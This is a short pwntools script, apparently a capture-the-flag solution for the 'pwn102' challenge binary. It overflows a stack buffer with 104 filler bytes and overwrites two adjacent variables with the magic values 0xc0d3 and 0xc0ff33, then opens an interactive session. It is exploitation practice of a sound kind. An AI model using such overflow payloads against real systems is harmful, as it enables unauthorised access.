from pwn import *


context.update(arch="amd64", os="linux")

# Fill input string and overwrite the value in the next int (i.e., 32 bits)
# variables in the stack
payload = b"A" * 104
payload += p32(0xc0d3)
payload += p32(0xc0ff33)

process = process("./pwn102-1644307392479.pwn102")
# process = remote("xxx", 9002)

process.clean()
process.sendline(payload)

process.interactive()